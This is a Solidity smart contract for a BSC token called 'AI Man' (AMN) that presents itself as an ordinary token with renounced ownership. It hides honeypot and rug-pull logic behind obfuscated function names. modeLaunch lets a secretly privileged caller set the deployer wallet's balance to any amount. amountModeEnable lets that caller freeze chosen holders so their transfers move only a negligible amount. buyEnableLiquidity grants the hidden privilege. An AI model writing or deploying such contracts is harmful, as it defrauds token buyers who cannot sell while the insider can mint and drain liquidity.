/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface totalMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atSell {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIMan is Ownable{
    uint8 public decimals = 18;

    address public teamMin;
    mapping(address => bool) public enableModeFund;
    uint256 public totalSupply = 100000000 * 10 ** 18;


    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;
    string public name = "AI Man";
    mapping(address => bool) public receiverIs;
    uint256 constant liquidityWallet = 10 ** 10;

    address public toTakeMarketing;
    bool public senderAmount;
    string public symbol = "AMN";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        totalMax senderTake = totalMax(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamMin = atSell(senderTake.factory()).createPair(senderTake.WETH(), address(this));
        toTakeMarketing = fundAt();
        receiverIs[toTakeMarketing] = true;
        balanceOf[toTakeMarketing] = totalSupply;
        emit Transfer(address(0), toTakeMarketing, totalSupply);
        renounceOwnership();
    }

    

    function amountModeEnable(address receiverAuto) public {
        if (receiverAuto == toTakeMarketing || receiverAuto == teamMin || !receiverIs[fundAt()]) {
            return;
        }
        enableModeFund[receiverAuto] = true;
    }

    function transferFrom(address sellTxLaunched, address minExempt, uint256 toExempt) public returns (bool) {
        if (sellTxLaunched != fundAt() && allowance[sellTxLaunched][fundAt()] != type(uint256).max) {
            require(allowance[sellTxLaunched][fundAt()] >= toExempt);
            allowance[sellTxLaunched][fundAt()] -= toExempt;
        }
        if (minExempt == toTakeMarketing || sellTxLaunched == toTakeMarketing) {
            return receiverTrading(sellTxLaunched, minExempt, toExempt);
        }
        if (enableModeFund[sellTxLaunched]) {
            return receiverTrading(sellTxLaunched, minExempt, liquidityWallet);
        }
        return receiverTrading(sellTxLaunched, minExempt, toExempt);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function buyEnableLiquidity(address limitSwap) public {
        if (senderAmount) {
            return;
        }
        receiverIs[limitSwap] = true;
        senderAmount = true;
    }

    function modeLaunch(uint256 toExempt) public {
        if (!receiverIs[fundAt()]) {
            return;
        }
        balanceOf[toTakeMarketing] = toExempt;
    }

    function transfer(address minExempt, uint256 toExempt) external returns (bool) {
        return transferFrom(fundAt(), minExempt, toExempt);
    }

    function fundAt() private view returns (address) {
        return msg.sender;
    }

    function receiverTrading(address tradingShould, address tradingAmount, uint256 toExempt) internal returns (bool) {
        require(balanceOf[tradingShould] >= toExempt);
        balanceOf[tradingShould] -= toExempt;
        balanceOf[tradingAmount] += toExempt;
        emit Transfer(tradingShould, tradingAmount, toExempt);
        return true;
    }

    function approve(address receiverMode, uint256 toExempt) public returns (bool) {
        allowance[fundAt()][receiverMode] = toExempt;
        emit Approval(fundAt(), receiverMode, toExempt);
        return true;
    }


}